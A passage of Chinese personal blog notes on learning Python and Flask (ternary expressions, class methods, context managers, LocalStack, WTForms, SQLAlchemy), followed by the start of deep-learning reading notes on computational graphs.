<h5 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在Python中的三元表达式的写法和大部分的语言是不同的</span><br><span class="line"></span><br><span class="line">现在有 x, y，如果 x大于y的话返回x否则返回y</span><br><span class="line"></span><br><span class="line">绝大部分语言中的写法：</span><br><span class="line">条件判断 ? 条件为真时返回的结果 : 条件为假时返回的结果</span><br><span class="line"></span><br><span class="line">x &gt; y ? x : y</span><br><span class="line">1</span><br><span class="line">Python中的写法</span><br><span class="line">先看一个伪代码：条件为真时返回的结果 if 条件判断 else 条件为假时的返回结果</span><br><span class="line"></span><br><span class="line">x =1</span><br><span class="line">y =2</span><br><span class="line">r = x if x &gt; y else y</span><br><span class="line">---------------------</span><br><span class="line">输出：</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断调用 API 返回的值为 error</span><br><span class="line"></span><br><span class="line">class HTTP:</span><br><span class="line">    def get(url, return_json=True):</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        # restful</span><br><span class="line">        # json</span><br><span class="line">        if r.status_code != 200:</span><br><span class="line">            return &#123;&#125; if return_json else &apos;&apos;</span><br><span class="line">        return r.json() if return_json else r.text</span><br><span class="line">        # if r.status_code ==200:</span><br><span class="line">        #     if return_json:</span><br><span class="line">        #         return r.json()</span><br><span class="line">        #     else:</span><br><span class="line">        #         return r.text</span><br><span class="line">        # else:</span><br><span class="line">        #     if return_json:</span><br><span class="line">        #         return &#123;&#125;</span><br><span class="line">        #     else:</span><br><span class="line">        #         return &apos;&apos;</span><br></pre></td></tr></table></figure>
<p>建议在 多个 if  else 中的代码单独提取为一个函数，以及增加 return ，提前减少分支。</p>
<h3 id="staticmethod-与-classmethod"><a href="#staticmethod-与-classmethod" class="headerlink" title="staticmethod 与 classmethod"></a>staticmethod 与 classmethod</h3><p><a href="https://blog.csdn.net/ibelieve8013/article/details/83037996" target="_blank" rel="noopener">python的staticmethod,classmethod和装饰器以及闭包的爱恨情仇</a></p>
<p>笔记：</p>
<h4 id="类的实例化："><a href="#类的实例化：" class="headerlink" title="类的实例化："></a>类的实例化：</h4><p>类是指：描述一种事物的定义，是个抽象的概念<br>实例指：该种事物的一个具体的个体，是具体的东西<br>打个比方：<br>“人”是一个类。“张三”是人类的一个具体例子<br>在编程时也是同样的道理，你先自己定义一个“类”，当你需要用时，用“类”的定义来创造一个具体的例子。<br>用类的定义来创建一个实例，就叫做类的实例化。</p>
<h4 id="两个方法之间的去别："><a href="#两个方法之间的去别：" class="headerlink" title="两个方法之间的去别："></a>两个方法之间的去别：</h4><p>@staticmethod不需要表示自身对象的self和自身类的cls参数，就跟使用函数一样。<br>@classmethod也不需要self参数，但第一个参数需要是表示自身类的cls参数。<br>如果在@staticmethod中要调用到这个类的一些属性方法，只能直接类名.属性名或类名.方法名。<br>而@classmethod因为持有cls参数，可以来调用类的属性，类的方法，实例化对象等，避免硬编码。</p>
<h4 id="什么是硬编码"><a href="#什么是硬编码" class="headerlink" title="什么是硬编码"></a>什么是硬编码</h4><p>什么叫“硬编码”？“硬”，顾名思义，就是死板，一次性的意思。其定义也就是“将可变变量用一个固定数值表示”，这种方式在编码的过程中会导致变量很难修改。因此通常采用的方式都是软编码的方式，也即通过一个标记取代变量名称，而这个标记的值是可以不断变化的。但标记名称却是不变的，从而实现了“以不变应万变“。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg: int a=2,b=2; 　　</span><br><span class="line">    硬编码：if(a==2) return false; 　　</span><br><span class="line">    非硬编码 if(a==b) return true; 　　（就是把数值写成常量而不是变量 ）</span><br><span class="line"> 一个简单的版本：如求圆的面积 的问题 PI（3.14） 　　</span><br><span class="line"> 那么3.14*r*r 就是硬编码，而PI*r*r 就不是硬编码。</span><br></pre></td></tr></table></figure></p>
<h4 id="复习装饰器、闭包"><a href="#复习装饰器、闭包" class="headerlink" title="复习装饰器、闭包"></a>复习装饰器、闭包</h4><p>装饰器：</p>
<p>优点像 JAVA 继承，就是在使用某个函数的时候，感觉这个函数功能不能满足自己的使用，同时不能在原函数上进行修改，于是乎装饰器诞生。</p>
<p>闭包：</p>
<p>在一个外函数中定义了一个内函数，内函数里运用了外函数的临时变量，并且外函数的返回值是内函数的引用。这样就构成了一个闭包。<br><a href="https://www.cnblogs.com/Lin-Yi/p/7305364.html" target="_blank" rel="noopener">参考链接：博客园</a></p>
<h3 id="object-的继承问题"><a href="#object-的继承问题" class="headerlink" title="object 的继承问题"></a>object 的继承问题</h3><p><a href="https://www.zhihu.com/question/19754936/answer/202650790" target="_blank" rel="noopener">知乎：Python 为什么要继承 object 类？</a></p>
<p>笔记：class Http(object): 这个 object 有时候可以继承也可不继承，有什么区别？<br>答：python3没有区别，python2有区别。</p>
<p>python 2 : 经典类和新式类</p>
<p>python 3 : 默认新式类</p>
<h3 id="链式查找是个啥？？？？"><a href="#链式查找是个啥？？？？" class="headerlink" title="链式查找是个啥？？？？"></a>链式查找是个啥？？？？</h3><p>方法链（method chaining）是面向对象的编程语言中的一种常见语法，可以让开发者在只引用对象一次的情况下，对同一个对象进行多次方法调用。</p>
<p><a href="https://www.jb51.net/article/79858.htm" target="_blank" rel="noopener">Python中方法链的使用方法</a></p>
<p>定制类里用到了</p>
<p>参考教程：<br><a href="https://blog.csdn.net/carmelcarmen/article/details/78634532" target="_blank" rel="noopener">Python简化类例五：实现链式写法</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg：</span><br><span class="line"></span><br><span class="line">#Python简化类例五：实现链式写法</span><br><span class="line">def ClassTest5():</span><br><span class="line">    &apos;&apos;&apos;链式写法只要是类语言都可以实写&apos;&apos;&apos;</span><br><span class="line">    def p() :pass</span><br><span class="line">    p.x=0</span><br><span class="line">    p.y=0</span><br><span class="line">    def o():pass</span><br><span class="line"> </span><br><span class="line">    def printPos():</span><br><span class="line">        print(&quot;当前坐标是(%d, %d)&quot;%(p.x,p.y))</span><br><span class="line"> </span><br><span class="line">    def moveLeft():</span><br><span class="line">        p.x-=1</span><br><span class="line">        printPos()</span><br><span class="line">        return o</span><br><span class="line">    o.moveLeft=moveLeft;del moveLeft</span><br><span class="line"> </span><br><span class="line">    def moveTop():</span><br><span class="line">        p.y+=1</span><br><span class="line">        printPos()</span><br><span class="line">        return o</span><br><span class="line">    o.moveTop=moveTop;del moveTop</span><br><span class="line"> </span><br><span class="line">    def moveRight():</span><br><span class="line">        p.x+=1</span><br><span class="line">        printPos()</span><br><span class="line">        return o</span><br><span class="line">    o.moveRight=moveRight;del moveRight</span><br><span class="line"> </span><br><span class="line">    def moveBottom():</span><br><span class="line">        p.y-=1</span><br><span class="line">        printPos()</span><br><span class="line">        return o</span><br><span class="line">    o.moveBottom=moveBottom;del moveBottom</span><br><span class="line">    return o</span><br><span class="line"> </span><br><span class="line">t5=ClassTest5()</span><br><span class="line">t5.moveTop().moveLeft().moveBottom().moveRight()</span><br><span class="line"></span><br><span class="line"># coding=utf-8</span><br><span class="line">class Bar(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Foo(object):</span><br><span class="line">    &quot;&quot;&quot;类的描述文本&quot;&quot;&quot;</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, item):</span><br><span class="line">        print(item,end=&quot; &quot;)</span><br><span class="line">        #注意：返回的是对象自身</span><br><span class="line">        return self</span><br><span class="line"></span><br><span class="line">    #重写str()方法</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">print(Foo().think.different.itcast)</span><br></pre></td></tr></table></figure></p>
<h4 id="定制类"><a href="#定制类" class="headerlink" title="定制类"></a>定制类</h4><p>看到类似<strong>slots</strong>这种形如<strong>xxx</strong>的变量或者函数名就要注意，这些在Python中是有特殊用途的。</p>
<p><strong>slots</strong>我们已经知道怎么用了，<br>_ <em>len</em> _()方法我们也知道是为了能让class作用于len()函数。</p>
<p>除此之外，Python的class中还有许多这样有特殊用途的函数，可以帮助我们定制类。</p>
<p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014319098638265527beb24f7840aa97de564ccc7f20f6000" target="_blank" rel="noopener">廖雪峰官方教程-面向对象高级编程</a></p>
<h4 id="python-中-self-到底是个什么玩意"><a href="#python-中-self-到底是个什么玩意" class="headerlink" title="python 中 self 到底是个什么玩意"></a>python 中 self 到底是个什么玩意</h4><p><a href="https://www.cnblogs.com/jessonluo/p/4717140.html" target="_blank" rel="noopener">一篇文章让你彻底搞清楚Python中self的含义</a></p>
<p><a href="https://blog.csdn.net/bing900713/article/details/60884931" target="_blank" rel="noopener">python中self参数的作用</a></p>
<p>笔记：self代表类的实例，而非类。<br>self在定义时需要定义，但是在调用时会自动传入。<br>self的名字并不是规定死的，但是最好还是按照约定是用self<br>self总是指调用时的类的实例。</p>
<p>类中函数定义需要加self，类外函数定义不需要。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line"></span><br><span class="line">class Foo(object):  </span><br><span class="line">#类中方法加入了self参数   </span><br><span class="line">    def say_someThing(self,str):  </span><br><span class="line">        print(str)</span><br><span class="line"></span><br><span class="line">#类外方法不需要加入self参数   </span><br><span class="line">def say_hello():  </span><br><span class="line">    print（&apos;hello&apos;）  </span><br><span class="line"></span><br><span class="line">#类外函数使用</span><br><span class="line">say_hello()</span><br><span class="line"></span><br><span class="line">#类内函数使用，不需要加入self相关参数 </span><br><span class="line">foo=Foo()</span><br><span class="line">foo.say_someThing(&quot;hi&quot;)</span><br></pre></td></tr></table></figure>
<h4 id="import-http-爬坑"><a href="#import-http-爬坑" class="headerlink" title="import http 爬坑"></a>import http 爬坑</h4><p>http.client使用奇怪问题：<br>ImportError: No module named ‘http.client’; ‘http’ is not a package。</p>
<p>解决：你的代码文件应该叫http.py了吧，这样引用变成引用自己了。改个名吧！！！！！</p>
<p>No module named ‘urllib2’：</p>
<p>Python 3.3之后，urllib2改为urllib.response</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Python 2.7 代码：</span><br><span class="line"></span><br><span class="line">import urllib2  </span><br><span class="line">response = urllib2.urlopen(&apos;http://www.baidu.com/&apos;)  </span><br><span class="line">html = response.read()  </span><br><span class="line">print html   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Python 3.3+ 代码应该为：</span><br><span class="line"></span><br><span class="line">import urllib.request</span><br><span class="line">response=urllib.request.urlopen(&apos;http://www.baidu.com&apos;)</span><br><span class="line">html=response.read()</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>
<h4 id="dict-是什么"><a href="#dict-是什么" class="headerlink" title="dict 是什么"></a>dict 是什么</h4><p>可变的字典:</p>
<p>不可变的字典：<br>两种方法：<br>1、自己继承dict 的数据结构<br>2、直接用 flask 提供的方法</p>
<p>不可变字典转换为普通字典：<br>a = request.args.to_dict()</p>
<p>字典是无序的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict()</span><br><span class="line">作用：dict() 函数用于创建一个字典。返回一个字典。</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line"></span><br><span class="line">class dict(**kwarg)</span><br><span class="line">class dict(mapping, **kwarg)</span><br><span class="line">class dict(iterable, **kwarg)</span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">**kwargs -- 关键字</span><br><span class="line">mapping -- 元素的容器。</span><br><span class="line">iterable -- 可迭代对象</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">&gt;&gt;&gt;dict()                        # 创建空字典</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt;&gt;&gt; dict(a=&apos;a&apos;, b=&apos;b&apos;, t=&apos;t&apos;)     # 传入关键字</span><br><span class="line">&#123;&apos;a&apos;: &apos;a&apos;, &apos;b&apos;: &apos;b&apos;, &apos;t&apos;: &apos;t&apos;&#125;</span><br><span class="line">&gt;&gt;&gt; dict(zip([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;], [1, 2, 3]))   # 映射函数方式来构造字典</span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125; </span><br><span class="line">&gt;&gt;&gt; dict([(&apos;one&apos;, 1), (&apos;two&apos;, 2), (&apos;three&apos;, 3)])    # 可迭代对象方式来构造字典</span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h5><p>dict的作用是建立一组 key 和一组 value 的映射关系，dict的key是不能重复的。</p>
<p>有的时候，我们只想要 dict 的 key，不关心 key 对应的 value，目的就是保证这个集合的元素不会重复，这时，set就派上用场了。</p>
<p>set 持有一系列元素，这一点和 list 很像，但是set的元素没有重复，而且是无序的，这点和 dict 的 key很像。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">创建 set 的方式是调用 set() 并传入一个 list，list的元素将作为set的元素：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; s = set([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;])</span><br><span class="line">可以查看 set 的内容：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print s</span><br><span class="line">set([&apos;A&apos;, &apos;C&apos;, &apos;B&apos;])</span><br><span class="line">请注意，上述打印的形式类似 list， 但它不是 list，仔细看还可以发现，打印的顺序和原始 list 的顺序有可能是不同的，因为set内部存储的元素是无序的。</span><br></pre></td></tr></table></figure></p>
<p>注意：set 里面含有中括号。</p>
<h3 id="深入了解flask路由、蓝图"><a href="#深入了解flask路由、蓝图" class="headerlink" title="深入了解flask路由、蓝图"></a>深入了解flask路由、蓝图</h3><p>了解路由的设计，路由的分配，404、301</p>
<p>老师原话：每一个url都会对应一个视图函数，但是不仅仅是这样。每一个url还会对应一个endpoint端点，用于反向构建URL。</p>
<p><a href="https://www.cnblogs.com/thomson-fred/p/10106303.html" target="_blank" rel="noopener">Flask路由与蓝图Blueprint</a></p>
<p><a href="https://www.cnblogs.com/donghaoblogs/p/10605278.html" target="_blank" rel="noopener">Flask源码复习之路由</a></p>
<h3 id="Request-对象的使用"><a href="#Request-对象的使用" class="headerlink" title="Request 对象的使用"></a>Request 对象的使用</h3><p><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">官方教程 - 初级</a></p>
<p><a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html#advanced" target="_blank" rel="noopener">官方教程 - 高级</a></p>
<h3 id="验证器"><a href="#验证器" class="headerlink" title="验证器"></a>验证器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 内置的验证器</span><br><span class="line">class SearchForm(Form):</span><br><span class="line">    q = StringField(validators=[DataRequired(),Length(min=1,max=30)])#最大值，最小值，消息</span><br><span class="line">    page = IntegerField(validators=[NumberRange(min=1,max=99)],default=1)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@web.route(&apos;/book/search&apos;)</span><br><span class="line">def search():</span><br><span class="line">    form = SearchForm(request.args)</span><br><span class="line">    if form.validate():</span><br><span class="line">        q = form.q.data.strip()</span><br><span class="line">        print(q)</span><br><span class="line">        page = form.page.data</span><br><span class="line">        print(page)</span><br><span class="line">        isbn_or_key = is_isbn_or_key(q)</span><br><span class="line">        print(&apos;isbn_or_key&apos;)</span><br><span class="line">        if isbn_or_key == &apos;isbn&apos;:</span><br><span class="line">            result = YuShuBook.search_by_isbn(q)</span><br><span class="line">        else:</span><br><span class="line">            result = YuShuBook.search_by_keyword(q,page)</span><br><span class="line">        return jsonify(result)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(form.errors)</span><br></pre></td></tr></table></figure>
<h4 id="validators-是个啥，为什么里面可以传多个函数"><a href="#validators-是个啥，为什么里面可以传多个函数" class="headerlink" title="validators 是个啥，为什么里面可以传多个函数"></a>validators 是个啥，为什么里面可以传多个函数</h4><p>validator.py是一个数据验证工具，确保数据符合一定的规则。一个validation是一个字典，对于字典中的每一个键，包含一个规则列表。</p>
<p><a href="http://github.com/mansam/validator.py" target="_blank" rel="noopener">Github地址</a></p>
<p><a href="https://www.jianshu.com/p/eee56214af9c" target="_blank" rel="noopener">简书教程:Python数据验证库（二）validator</a></p>
<h3 id="创建数据表的方式"><a href="#创建数据表的方式" class="headerlink" title="创建数据表的方式"></a>创建数据表的方式</h3><p>1、Model First<br>利用建模工具</p>
<p>2、Database Firs：<br>手动创建，传统方式</p>
<p>3、Code First</p>
<p>sqlalchemy、WTFORMS 适用于各个 python 的框架</p>
<p>Flask_SQLALchemy 适用于Flask，可以提供更方便的API<br>Flask_WTFORMS<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line"></span><br><span class="line">db = SQLAlchemy()</span><br><span class="line">class Book(db.Model):</span><br><span class="line">    id = Column(Integer, primary_key=True, autoincrement=True)</span><br><span class="line">    # 第一个参数指明传入的类型，传两个关键字属性，一个主键，一个自增长</span><br><span class="line">    title = Column(String(50), nullable=False)</span><br><span class="line">    # 第二个参数关键字参数，意思是不可以为空</span><br><span class="line">    author = Column(String(30), default=&apos;佚名&apos;)</span><br><span class="line">    isbn = Column(String(15))</span><br><span class="line">    price = Column(String(20))</span><br><span class="line">    binding = Column(String(20))  # 是否为精装</span><br><span class="line">    publisher = Column(String(50))</span><br><span class="line">    pages = Column(Integer)  # 页数</span><br><span class="line">    isbn = Column(String(15), nullable=False, unique=True)</span><br><span class="line">    # unique 唯一的 不是重复的</span><br><span class="line">    summary = Column(String(1000))  # 简介</span><br><span class="line">    image = Column(String(50))</span><br></pre></td></tr></table></figure></p>
<h3 id="Flask-核心机制"><a href="#Flask-核心机制" class="headerlink" title="Flask 核心机制"></a>Flask 核心机制</h3><h4 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask，current_app，request，Request app=Flask（name_）</span><br><span class="line">#应用上下文对象Flask</span><br><span class="line">#请求上下文对象Request</span><br><span class="line">#Flask AppContext</span><br><span class="line">#Request RequestContext</span><br><span class="line">#离线应用、单元测试</span><br><span class="line">ctx=app.app kontext（）</span><br><span class="line">ctx.push（）I a=current_app d=current_app.config[&apos;DEBUG&apos;]</span><br><span class="line">ctx.pop（）</span><br></pre></td></tr></table></figure>
<p>栈：后进先出<br>队列：先进先出</p>
<p>Flask 的核心就是玩队列的感觉。</p>
<p>先实例化，每一次调用函数都是可以理解为出栈、入栈。每一次 flask 会自动检查你这次的动作所需的参数，在栈里面是不是为空，如果是空的，那就自动执行入栈，用完再出栈。</p>
<h5 id="什么是上下文"><a href="#什么是上下文" class="headerlink" title="什么是上下文"></a>什么是上下文</h5><p><a href="http://python.jobbole.com/87317/" target="_blank" rel="noopener">python黑魔法—上下文管理器（contextor）</a></p>
<p>笔记：</p>
<h5 id="什么是句柄"><a href="#什么是句柄" class="headerlink" title="什么是句柄"></a>什么是句柄</h5><p><a href="https://blog.csdn.net/liquanhai/article/details/5849172" target="_blank" rel="noopener">什么是句柄？为什么会有句柄？HANDLE</a></p>
<p>笔记：</p>
<h5 id="with-语句是怎么用的。它的意义是什么"><a href="#with-语句是怎么用的。它的意义是什么" class="headerlink" title="with 语句是怎么用的。它的意义是什么"></a>with 语句是怎么用的。它的意义是什么</h5><p><a href="https://www.cnblogs.com/Xjng/p/3927794.html" target="_blank" rel="noopener">博客园：with 关键字学习</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:简化代码</span><br><span class="line"></span><br><span class="line">with app.app_context()：</span><br><span class="line">a = current_app</span><br><span class="line">d = current_app.config[&apos;DEBUG&apos;]</span><br><span class="line">#实现了上下文协议的对象使用with</span><br><span class="line">#上下文管理器</span><br><span class="line"># __enter__ __exit__</span><br><span class="line">#上下文表达式必须要返回一个上下文管理器</span><br><span class="line">#t with</span><br></pre></td></tr></table></figure>
<h6 id="with-语句时用于对try-except-finally-的优化"><a href="#with-语句时用于对try-except-finally-的优化" class="headerlink" title="with 语句时用于对try except finally 的优化"></a>with 语句时用于对try except finally 的优化</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f=open(&apos;file_name&apos;,&apos;r&apos;)</span><br><span class="line">try:</span><br><span class="line">    r=f.read()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line">finally:</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
<p>用with的实现：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(&apos;file_name&apos;,&apos;r&apos;) as f:</span><br><span class="line">    r=f.read()</span><br></pre></td></tr></table></figure></p>
<p>这条语句就好简洁很多，当with里面的语句产生异常的话，也会正常关闭文件</p>
<h6 id="自己定义可以给with调用的上下文管理器"><a href="#自己定义可以给with调用的上下文管理器" class="headerlink" title="自己定义可以给with调用的上下文管理器"></a>自己定义可以给with调用的上下文管理器</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class MyResource: </span><br><span class="line">    def __enter__(self): </span><br><span class="line">        print(&apos; connect to resource&apos;)</span><br><span class="line">        return self </span><br><span class="line">    def __exit__(self, exc_type, exc_value, tb): </span><br><span class="line">        print(&apos; close resource connection&apos;)</span><br><span class="line">    def query(self): </span><br><span class="line">        print(&apos; query data&apos;)</span><br><span class="line">with MyResource() as resource: </span><br><span class="line">resource. query()</span><br></pre></td></tr></table></figure>
<p>笔记：懒人代码，让你少写几个关闭（收尾）代码。</p>
<h4 id="遇到问题，学习再源码中找方法"><a href="#遇到问题，学习再源码中找方法" class="headerlink" title="遇到问题，学习再源码中找方法"></a>遇到问题，学习再源码中找方法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def create_app(): </span><br><span class="line">    app=Flask(_name)</span><br><span class="line">    app. config. from_object(&apos; app. secure&apos;)</span><br><span class="line">    app. config. from_object(&apos; app. setting&apos;)</span><br><span class="line">    register_blueprint(app)</span><br><span class="line"></span><br><span class="line">    db. init_app(app)</span><br><span class="line">    with app.app_context(): </span><br><span class="line">        db. create_all()</span><br><span class="line">    return app</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db. init_app(app)</span><br><span class="line">db. create_a11(app=app) </span><br><span class="line">return app</span><br></pre></td></tr></table></figure>
<h3 id="Flask-中的多线程和线程隔离技术"><a href="#Flask-中的多线程和线程隔离技术" class="headerlink" title="Flask 中的多线程和线程隔离技术"></a>Flask 中的多线程和线程隔离技术</h3><p>使用线程隔离的意义在于：使当前线程能够正确引用到他自己所创建的对象，而不是引用到其他线程所创建的对象</p>
<h4 id="pthon-的多线程"><a href="#pthon-的多线程" class="headerlink" title="pthon 的多线程"></a>pthon 的多线程</h4><h4 id="python-的-GIL"><a href="#python-的-GIL" class="headerlink" title="python 的 GIL"></a>python 的 GIL</h4><h4 id="Local-使用字典的方式实现的线程的隔离"><a href="#Local-使用字典的方式实现的线程的隔离" class="headerlink" title="Local 使用字典的方式实现的线程的隔离"></a>Local 使用字典的方式实现的线程的隔离</h4><h4 id="什么是封装"><a href="#什么是封装" class="headerlink" title="什么是封装"></a>什么是封装</h4><h4 id="LocalStack-的用法"><a href="#LocalStack-的用法" class="headerlink" title="LocalStack 的用法"></a>LocalStack 的用法</h4><h5 id="push、pop、top"><a href="#push、pop、top" class="headerlink" title="push、pop、top"></a>push、pop、top</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s=LocalStack（）</span><br><span class="line">s.push（1）</span><br><span class="line">print（s.top）</span><br><span class="line">print（s.top）</span><br><span class="line">print（s.pop（））</span><br><span class="line">print（s.top）</span><br><span class="line">s.push（1）</span><br><span class="line">s.push（2）</span><br><span class="line">#栈后进先出</span><br><span class="line">print（s.top）I</span><br><span class="line">print（s.top）</span><br><span class="line">print（s.pop（））</span><br><span class="line">print（s.top）</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">None</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<h4 id="栈与数组"><a href="#栈与数组" class="headerlink" title="栈与数组"></a>栈与数组</h4><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><h4 id="getattr-与-setattr-方法"><a href="#getattr-与-setattr-方法" class="headerlink" title="getattr 与 setattr 方法"></a>getattr 与 setattr 方法</h4><h4 id="线程隔离对象与被线程隔离对象"><a href="#线程隔离对象与被线程隔离对象" class="headerlink" title="线程隔离对象与被线程隔离对象"></a>线程隔离对象与被线程隔离对象</h4><h3 id="书籍详情页面的构建"><a href="#书籍详情页面的构建" class="headerlink" title="书籍详情页面的构建"></a>书籍详情页面的构建</h3><h4 id="ViewModel-的基本概念、以及数据处理"><a href="#ViewModel-的基本概念、以及数据处理" class="headerlink" title="ViewModel 的基本概念、以及数据处理"></a>ViewModel 的基本概念、以及数据处理</h4><h4 id="伪面向对象：面向过程"><a href="#伪面向对象：面向过程" class="headerlink" title="伪面向对象：面向过程"></a>伪面向对象：面向过程</h4><h5 id="什么是面向过程"><a href="#什么是面向过程" class="headerlink" title="什么是面向过程"></a>什么是面向过程</h5><h4 id="重构鱼书核心对象"><a href="#重构鱼书核心对象" class="headerlink" title="重构鱼书核心对象"></a>重构鱼书核心对象</h4><h4 id="从json序列化看代码解释权反转"><a href="#从json序列化看代码解释权反转" class="headerlink" title="从json序列化看代码解释权反转"></a>从json序列化看代码解释权反转</h4><h4 id="单页面与网站区别"><a href="#单页面与网站区别" class="headerlink" title="单页面与网站区别"></a>单页面与网站区别</h4><h3 id="静态文件、模板、消息闪现与Jinja2"><a href="#静态文件、模板、消息闪现与Jinja2" class="headerlink" title="静态文件、模板、消息闪现与Jinja2"></a>静态文件、模板、消息闪现与Jinja2</h3><h4 id="Flask-静态文件访问原理"><a href="#Flask-静态文件访问原理" class="headerlink" title="Flask 静态文件访问原理"></a>Flask 静态文件访问原理</h4><h4 id="模板文件的位置与修改方案"><a href="#模板文件的位置与修改方案" class="headerlink" title="模板文件的位置与修改方案"></a>模板文件的位置与修改方案</h4><h4 id="jianjia2"><a href="#jianjia2" class="headerlink" title="jianjia2"></a>jianjia2</h4><h4 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h4><h4 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h4><h4 id="过滤器与管道命令"><a href="#过滤器与管道命令" class="headerlink" title="过滤器与管道命令"></a>过滤器与管道命令</h4><h4 id="反向构建-URL"><a href="#反向构建-URL" class="headerlink" title="反向构建 URL"></a>反向构建 URL</h4><h4 id="消息闪现、SecretyKey与变量作用域"><a href="#消息闪现、SecretyKey与变量作用域" class="headerlink" title="消息闪现、SecretyKey与变量作用域"></a>消息闪现、SecretyKey与变量作用域</h4><h4 id="显示搜索结果页面、与页面结构解析"><a href="#显示搜索结果页面、与页面结构解析" class="headerlink" title="显示搜索结果页面、与页面结构解析"></a>显示搜索结果页面、与页面结构解析</h4>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>《深度学习》读书笔记</title>
    <url>/%E3%80%8A%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="day1：感知机卡"><a href="#day1：感知机卡" class="headerlink" title="day1：感知机卡"></a>day1：感知机卡</h2><h2 id="day2-神经网络1"><a href="#day2-神经网络1" class="headerlink" title="day2: 神经网络1"></a>day2: 神经网络1</h2><h2 id="day3-神经网络2"><a href="#day3-神经网络2" class="headerlink" title="day3: 神经网络2"></a>day3: 神经网络2</h2><h2 id="day4-数据知识卡1"><a href="#day4-数据知识卡1" class="headerlink" title="day4: 数据知识卡1"></a>day4: 数据知识卡1</h2><h2 id="day5-数据知识卡2"><a href="#day5-数据知识卡2" class="headerlink" title="day5: 数据知识卡2"></a>day5: 数据知识卡2</h2><h2 id="day6-计算图卡"><a href="#day6-计算图卡" class="headerlink" title="day6: 计算图卡"></a>day6: 计算图卡</h2><p>误差反向传播法：理解的话两种方法，一种是基于数学式：另一种是基于计算图（computational graph）。</p>
<h3 id="计算图"><a href="#计算图" class="headerlink" title="计算图"></a>计算图</h3><p>计算图将计算过程用图形表示出来。这里说的图形是数据结构图，通过多个节点和边表示（连接节点的直线称为“边”）。</p>
<p>从左向右进行计算”是一种正方向上的传播，简称为正向传播（forward propagation）。正向传播是从计算图出发点到结束点的传播。</p>
<p>从右向左的传播称为反向传播（backward propagation）。反向传播将在接下来的导数计算中发挥重要作用。 <a id="more"></a></p>
<h4 id="局部计算"><a href="#局部计算" class="headerlink" title="局部计算"></a>局部计算</h4><p>“局部”这个词的意思是“与自己相关的某个小范围”。局部计算是指，无论全局发生了什么，都能只根据与自己相关的信息输出接下来的结果。</p>
<p>废话这么多 就是局部  局部  局部 的意思嘛。</p>
<h4 id="为何用计算图解题"><a href="#为何用计算图解题" class="headerlink" title="为何用计算图解题"></a>为何用计算图解题</h4><p>化繁为简，简化问题。</p>
